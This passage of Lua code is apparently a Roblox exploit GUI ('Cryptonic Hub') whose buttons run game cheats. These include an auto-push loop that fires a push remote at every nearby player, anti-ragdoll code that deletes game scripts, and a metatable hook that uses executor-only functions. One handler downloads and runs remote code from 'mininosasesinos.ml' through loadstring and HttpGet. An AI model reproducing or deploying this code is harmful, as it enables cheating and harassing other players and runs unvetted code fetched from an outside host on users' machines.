		LastIteration = TimeFunction()
		for Index = #FrameUpdateTable, 1, -1 do
			FrameUpdateTable[Index + 1] = FrameUpdateTable[Index] >= LastIteration - 1 and FrameUpdateTable[Index] or nil
		end
	
		FrameUpdateTable[1] = LastIteration
		FpsLabel.Text = "Fps: " .. tostring(math.floor(TimeFunction() - Start >= 1 and #FrameUpdateTable or #FrameUpdateTable / (TimeFunction() - Start)))
	end
	
	Start = TimeFunction()
	RunService.Heartbeat:Connect(HeartbeatUpdate)
end
coroutine.wrap(OGCSVX_fake_script)()
local function JSEARD_fake_script() -- home.LocalScript 
	local script = Instance.new('LocalScript', home)

	script.Parent.MouseButton1Click:Connect(function()
		local a = script.Parent.Parent.Framewelcome
		local b = script.Parent.Parent.franescripts
		local c = script.Parent.Parent.target
		local d = script.Parent.Parent.localply
		
		a.Visible = true
		b.Visible = false
		c.Visible = false
		d.Visible = false
		
	end)
end
coroutine.wrap(JSEARD_fake_script)()
local function VVJOCN_fake_script() -- scripts.LocalScript 
	local script = Instance.new('LocalScript', scripts)

	script.Parent.MouseButton1Click:Connect(function()
		local a = script.Parent.Parent.Framewelcome
		local b = script.Parent.Parent.franescripts
		local c = script.Parent.Parent.target
		local d = script.Parent.Parent.localply
	
		a.Visible = false
		b.Visible = true
		c.Visible = false
		d.Visible = false
	
	end)
end
coroutine.wrap(VVJOCN_fake_script)()
local function MWOHAYQ_fake_script() -- Target.LocalScript 
	local script = Instance.new('LocalScript', Target)

	script.Parent.MouseButton1Click:Connect(function()
		local a = script.Parent.Parent.Framewelcome
		local b = script.Parent.Parent.franescripts
		local c = script.Parent.Parent.target
		local d = script.Parent.Parent.localply
	
		a.Visible = false
		b.Visible = false
		c.Visible = true
		d.Visible = false
	
	end)
end
coroutine.wrap(MWOHAYQ_fake_script)()
local function TDQFP_fake_script() -- Localplayer.LocalScript 
	local script = Instance.new('LocalScript', Localplayer)

	script.Parent.MouseButton1Click:Connect(function()
		local a = script.Parent.Parent.Framewelcome
		local b = script.Parent.Parent.franescripts
		local c = script.Parent.Parent.target
		local d = script.Parent.Parent.localply
	
		a.Visible = false
		b.Visible = false
		c.Visible = false
		d.Visible = true
	
	end)
end
coroutine.wrap(TDQFP_fake_script)()
local function HWEUGEO_fake_script() -- uno.LocalScript 
	local script = Instance.new('LocalScript', uno)

	
	script.Parent.MouseButton1Down:Connect(function()
		game:GetService'RunService'.Stepped:Connect(function()
			for i, plr in ipairs(game:GetService("Players"):GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					local character = plr.Character or plr.CharacterAdded:Wait()
					local hrp = character.HumanoidRootPart
					if (game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position - hrp.Position).Magnitude < 20 then
						game.Players.LocalPlayer.Character:FindFirstChild('Push'):FindFirstChild('PushTool'):FireServer(plr.Character)
					end
				end
			end
		end)
	end)
	
end
coroutine.wrap(HWEUGEO_fake_script)()
local function PBVYEWN_fake_script() -- dos.LocalScript 
	local script = Instance.new('LocalScript', dos)

	
	script.Parent.MouseButton1Down:Connect(function()
		--// anti-ragdoll made by demvkrao#0069 <3
	
		for i,script in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
			if script.Name == "StartRagdoll" or script.Name == "Pushed" or script.Name == "RagdollMe" or script.Name == "KillScript" or script.Name == "Falling down" or script.Name == "Swimming" then
				script:Destroy()
			end
		end
		
	end)
	
end
coroutine.wrap(PBVYEWN_fake_script)()
local function YRBFIPN_fake_script() -- tres.LocalScript 
	local script = Instance.new('LocalScript', tres)

	
	script.Parent.MouseButton1Down:Connect(function()local CoreGui = game:GetService("StarterGui")
	
		CoreGui:SetCore("SendNotification", {
			Title = "Cryptonic Hub";
			Text = "Make sure you execute the anti ragdoll first";
			Duration = 5;
		})	
		game.Players.LocalPlayer.Character.HumanoidRootPart.ChildAdded:Connect(function(obj)
			if obj:IsA("BodyVelocity") then
				obj.P = 0
				obj.MaxForce = Vector3.new(0,0,0)
				obj.Velocity = Vector3.new(0,0,0)
			end
		end)
	end)
	
end
coroutine.wrap(YRBFIPN_fake_script)()
local function MGAD_fake_script() -- cuatro.LocalScript 
	local script = Instance.new('LocalScript', cuatro)

	
	script.Parent.MouseButton1Down:Connect(function()
		local mt = getrawmetatable(game);
	
		old = hookfunction(mt.__namecall, function(...)
			local args = {...}
			local self = args[1]
			local method = getnamecallmethod();
			if method == "ChangeState" and tostring(self) == "Humanoid" and args[2] == Enum.HumanoidStateType.FallingDown or args[2] == Enum.HumanoidStateType.Physics then
				return error("lol", 4);
			end
			return old(unpack(args))
		end)
		
	end)
	
end
coroutine.wrap(MGAD_fake_script)()
local function JOOECBV_fake_script() -- xd.LocalScript 
	local script = Instance.new('LocalScript', xd)

	
	script.Parent.MouseButton1Down:Connect(function()
	
	end)
	
end
coroutine.wrap(JOOECBV_fake_script)()
local function TNHAMJ_fake_script() -- lol.LocalScript 
	local script = Instance.new('LocalScript', lol)

	
	script.Parent.MouseButton1Down:Connect(function()
	
	end)
	
end
coroutine.wrap(TNHAMJ_fake_script)()
local function MDSXBJ_fake_script() -- ungoto.LocalScript 
	local script = Instance.new('LocalScript', ungoto)

	
	
	
	script.Parent.MouseButton1Down:Connect(function()
	
		local plrs = game:GetService("Players")
		local plr  = plrs.LocalPlayer
		local playerTextBox = script.Parent.Parent.id
		script.Parent.MouseButton1Down:Connect(function()
			_G.xd = false
			while _G.xd do
				plr.Character.HumanoidRootPart.CFrame = plrs[tostring(playerTextBox.Text)].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,0.9)
			end
		end)
	end)
end
coroutine.wrap(MDSXBJ_fake_script)()
local function SQDSDJI_fake_script() -- push.LocalScript 
	local script = Instance.new('LocalScript', push)

	
	script.Parent.MouseButton1Down:Connect(function()
		game:GetService'RunService'.Stepped:Connect(function()
			for i, plr in ipairs(game:GetService("Players"):GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					local character = plr.Character or plr.CharacterAdded:Wait()
					local hrp = character.HumanoidRootPart
					if (game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position - hrp.Position).Magnitude < 20 then
						game.Players.LocalPlayer.Character:FindFirstChild('Push'):FindFirstChild('PushTool'):FireServer(plr.Character)
					end
				end
			end
			print("sure")
			loadstring(game:HttpGet("https://mininosasesinos.ml/antiragdoll.lua"))();
		end)
	end)
end
coroutine.wrap(SQDSDJI_fake_script)()
local function OUAN_fake_script() -- goto.LocalScript 
	local script = Instance.new('LocalScript', goto)

	
	script.Parent.MouseButton1Down:Connect(function()
	
		local plrs = game:GetService("Players")
		local plr  = plrs.LocalPlayer
		local playerTextBox = script.Parent.Parent.id
		script.Parent.MouseButton1Down:Connect(function()
			_G.xd = wait
			while _G.xd() do
	
				plr.Character.HumanoidRootPart.CFrame = plrs[tostring(playerTextBox.Text)].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,0.9)
	
			end
		end)
	end)
	
end
coroutine.wrap(OUAN_fake_script)()
local function QIAGBM_fake_script() -- MainFrame.welcome 
	local script = Instance.new('LocalScript', MainFrame)

	local CoreGui = game:GetService("StarterGui")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	CoreGui:SetCore("SendNotification", {
		Title = "Cryptonic Hub";
		Text = "Welcome! " .. game.Players.LocalPlayer.Name;
		Icon = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..player.Name;
		Duration = 7;
	})
	
end
coroutine.wrap(QIAGBM_fake_script)()
